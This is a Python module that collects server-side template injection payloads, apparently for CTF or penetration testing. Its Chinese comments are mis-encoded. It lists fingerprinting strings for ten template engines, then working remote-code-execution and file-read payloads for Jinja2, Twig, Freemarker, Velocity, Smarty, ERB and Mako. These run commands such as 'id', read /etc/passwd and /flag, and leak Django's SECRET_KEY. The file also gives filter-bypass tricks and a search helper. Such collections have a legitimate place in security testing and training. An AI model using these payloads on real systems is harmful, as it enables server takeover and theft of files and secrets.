"""SSTI (Server-Side Template Injection) Payload çæå¨.

æ¯ææ¨¡æ¿å¼æ:
    - Jinja2 / Flask
    - Twig (PHP)
    - Freemarker (Java)
    - Velocity (Java)
    - Smarty (PHP)
    - ERB (Ruby)
    - Mako / Tornado (Python)
    - Django (Python)
    - Jade / Pug (Node.js)
    - Handlebars (Node.js)
"""
from typing import List, Dict


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  æ£æµ Payload (Fingerprinting)
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

DETECTION: Dict[str, List[str]] = {
    "Jinja2 (Flask)": [
        "{{7*7}}",                          # é¢æ: 49
        "{{'test'.upper()}}",               # é¢æ: TEST
        "{{config}}",                       # é¢æ: <Config ...>
        "{{[].__class__.__base__}}",        # å¯¹è±¡æ¢æµ
        "{{''.__class__.__mro__}}",
        "${7*7}",                           # æ¿ä»£è¯­æ³
        "{{self.__init__.__globals__}}",
    ],
    "Twig (PHP/Symfony)": [
        "{{7*7}}",                          # é¢æ: 49
        "{{_self.env}}",                    # ç¯å¢æ³é²
        "{{dump(app)}}",                    # dump å½æ°
        "{{include('index.html')}}",        # æä»¶åå«
        "{{'/etc/passwd'|file_excerpt(1,30)}}",
    ],
    "Freemarker (Java)": [
        "${7*7}",                           # é¢æ: 49
        "${product('test')}",
        "<#assign x=7*7>${x}</#assign>",    # èµå¼è¯­æ³
        "${.data_model.key_set()}",
        "${object.getClass()}",
    ],
    "Velocity (Java)": [
        "#set($x=7*7)$x",                   # é¢æ: 49
        "${class}",
        "#set($runtime = $class.forName('java.lang.Runtime'))",
    ],
    "Smarty (PHP)": [
        "{$smarty.version}",
        "{7*7}",
        "{php}echo 'test';{/php}",
        "{include file='index.php'}",
        "{system('id')}",
    ],
    "ERB (Ruby)": [
        "<%= 7*7 %>",                       # é¢æ: 49
        "<%= system('id') %>",
        "<%= File.read('/etc/passwd') %>",
        "<%= `ls` %>",
    ],
    "Mako (Python)": [
        "${7*7}",                           # é¢æ: 49
        "${self.module.cache.util.os}",
        "<% import os %>${os.popen('id').read()}",
    ],
    "Django": [
        "{{ 7*7 }}",
        "{% debug %}",
        "{{ settings.SECRET_KEY }}",
        "{% include './settings.py' %}",
    ],
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  å©ç¨ Payload (RCE / æä»¶è¯»å)
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

EXPLOIT: Dict[str, List[Dict[str, str]]] = {
    "Jinja2 (Flask)": [
        {
            "name": "RCE - subprocess.Popen (æå¸¸ç¨)",
            "payload": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
        },
        {
            "name": "RCE - __subclasses__ é¾",
            "payload": "{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['sys'].modules['os'].popen('id').read() }}",
            "note": "X éè¦æ¿æ¢ä¸º subprocess.Popen çç´¢å¼, ç¨æç´¢åè½æ¥æ¾",
        },
        {
            "name": "RCE - lipsum æ¹å¼",
            "payload": "{{ lipsum.__globals__['os'].popen('id').read() }}",
        },
        {
            "name": "RCE - request.application",
            "payload": "{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}",
        },
        {
            "name": "RCE - config æ¹å¼",
            "payload": "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
        },
        {
            "name": "æä»¶è¯»å - open",
            "payload": "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}",
        },
        {
            "name": "æä»¶è¯»å - lipsum",
            "payload": "{{ lipsum.__globals__.__builtins__.open('/flag').read() }}",
        },
        {
            "name": "ä¿¡æ¯æ³é² - config",
            "payload": "{{ config }}",
        },
        {
            "name": "Bypass è¿æ»¤ [[]] - attr()",
            "payload": "{{ ()|attr('__class__')|attr('__base__')|attr('__subclasses__')() }}",
        },
        {
            "name": "Bypass è¿æ»¤ _ - request",
            "payload": "{{ (request|attr(request.args.attr)).__init__.__globals__.__builtins__ }}",
            "note": "éè¦ä¼ å ?attr=__class__",
        },
        {
            "name": "Bypass è¿æ»¤å¼å· - request.args",
            "payload": "{{ lipsum.__globals__.__builtins__.open(request.args.f).read() }}",
            "note": "éè¦ä¼ å ?f=/flag",
        },
        {
            "name": "Bypass è¿æ»¤ - å­ç¬¦ä¸²æ¼æ¥",
            "payload": "{{ ()|attr('__cla'+'ss__')|attr('__bas'+'e__') }}",
        },
        {
            "name": "Bypass è¿æ»¤ - åå­è¿å¶",
            "payload": "{{ ()['\\x5f\\x5fclass\\x5f\\x5f'] }}",
        },
    ],
    "Twig (PHP/Symfony)": [
        {
            "name": "RCE - sort filter",
            "payload": "{{ ['id', '']|sort('system') }}",
        },
        {
            "name": "RCE - filter",
            "payload": "{{ ['cat /flag']|filter('system') }}",
        },
        {
            "name": "RCE - map filter",
            "payload": "{{ ['whoami']|map('system')|join }}",
        },
        {
            "name": "æä»¶è¯»å - file_excerpt",
            "payload": "{{ '/etc/passwd'|file_excerpt(1, -1) }}",
        },
        {
            "name": "ä¿¡æ¯æ³é² - _self",
            "payload": "{{ _self.env.registerUndefinedFilterCallback('system') }}{{ ['id']|map('system') }}",
        },
    ],
    "Freemarker (Java)": [
        {
            "name": "RCE - Execute (ç»å¸)",
            "payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /flag')}",
        },
        {
            "name": "RCE - ObjectConstructor",
            "payload": "${'freemarker.template.utility.ObjectConstructor'?new()('java.lang.ProcessBuilder','cat','/flag').start()}",
        },
        {
            "name": "RCE - JythonRuntime",
            "payload": "${'freemarker.template.utility.JythonRuntime'?new()('import os;os.system(\"id\")')}",
        },
    ],
    "Velocity (Java)": [
        {
            "name": "RCE - Runtime.exec",
            "payload": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$chr.toString($out.read())#end",
        },
    ],
    "Smarty (PHP)": [
        {
            "name": "RCE - system",
            "payload": "{system('cat /flag')}",
        },
        {
            "name": "RCE - php æ ç­¾",
            "payload": "{php}system('id');{/php}",
        },
        {
            "name": "æä»¶è¯»å - include",
            "payload": "{include file='/etc/passwd'}",
        },
    ],
    "ERB (Ruby)": [
        {
            "name": "RCE - system",
            "payload": "<%= system('cat /flag') %>",
        },
        {
            "name": "RCE - åå¼å·",
            "payload": "<%= `cat /flag` %>",
        },
        {
            "name": "æä»¶è¯»å - File.read",
            "payload": "<%= File.read('/flag') %>",
        },
        {
            "name": "æä»¶è¯»å - IO.readlines",
            "payload": "<%= IO.readlines('/flag') %>",
        },
    ],
    "Mako (Python)": [
        {
            "name": "RCE - os.popen",
            "payload": "<%\nimport os\nx=os.popen('id').read()\n%>${x}",
        },
    ],
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  Bypass / è¿æ»¤ç»è¿åç»
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

BYPASS_FILTERS: Dict[str, List[str]] = {
    "å¼å·è¿æ»¤ç»è¿": [
        "request.args.param          â ç¨ GET åæ°ä¼ å¥å­ç¬¦ä¸²",
        "request.values.param        â ç¨ POST åæ°ä¼ å¥å­ç¬¦ä¸²",
        "request.cookies.param       â ç¨ Cookie ä¼ å¥å­ç¬¦ä¸²",
        "dict(__cl=dict,ass__=1)|join â å­å¸é®æ¼æ¥",
        "()|attr('\\x5f\\x5f'+'class\\x5f\\x5f') â åå­è¿å¶ç»è¿",
    ],
    "ç¹å·è¿æ»¤ç»è¿": [
        "()|attr('__class__')        â attr() è¿æ»¤å¨",
        "()['__class__']             â å­å¸ç´¢å¼",
        "()|attr(request.args.a)     â ä»è¯·æ±åæ°åå±æ§å",
    ],
    "ä¸åçº¿è¿æ»¤ç»è¿": [
        "request.args.param          â ä»è¯·æ±è·å",
        "()|attr('\\x5f\\x5fclass\\x5f\\x5f') â åå­è¿å¶",
        "'_'*2~'class'~'_'*2         â å­ç¬¦ä¸²æ¼æ¥",
    ],
    "æ¹æ¬å·è¿æ»¤ç»è¿": [
        "().__getitem__('class')     â __getitem__",
        "()|attr('__class__')        â attr",
        "().__class__                â ç¹å·",
    ],
    "å³é®å­è¿æ»¤ç»è¿": [
        "eval â lip.sum.__globals__['__builtins__']['ev'+'al']",
        "import â __builtins__['__imp'+'ort__']",
        "popen â ...os['po'+'pen']",
        "class â __dict__['__cla'+'ss__']",
    ],
}


def get_detection(engine: str = "") -> dict:
    """è·åæ£æµ Payload åè¡¨."""
    if engine and engine in DETECTION:
        return {engine: DETECTION[engine]}
    return DETECTION


def get_exploit(engine: str = "") -> dict:
    """è·åå©ç¨ Payload åè¡¨."""
    if engine and engine in EXPLOIT:
        return {engine: EXPLOIT[engine]}
    return EXPLOIT


def get_bypass() -> dict:
    """è·åç»è¿è¿æ»¤çæå·§åè¡¨."""
    return BYPASS_FILTERS


def search_payload(keyword: str) -> list:
    """å¨ææ Payload ä¸­æç´¢å³é®å­."""
    results = []
    for engine, payloads in EXPLOIT.items():
        for p in payloads:
            if keyword.lower() in p["payload"].lower() or keyword.lower() in p.get("note", "").lower():
                results.append({"engine": engine, **p})
    return results


def subclasses_finder() -> str:
    """çæç¨äºæ¥æ¾ subprocess.Popen ç´¢å¼çæ£æµ Payload."""
    return (
        "{{ ''.__class__.__mro__[1].__subclasses__() }}"
        "\n# å¨è¾åºä¸­æç´¢ 'subprocess.Popen', è®°ä¸å®çç´¢å¼ (ä»0å¼å§æ°)"
        "\n# ç¶åå° X æ¿æ¢ä¸ºè¯¥ç´¢å¼:"
        "\n# {{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['sys'].modules['os'].popen('id').read() }}"
    )
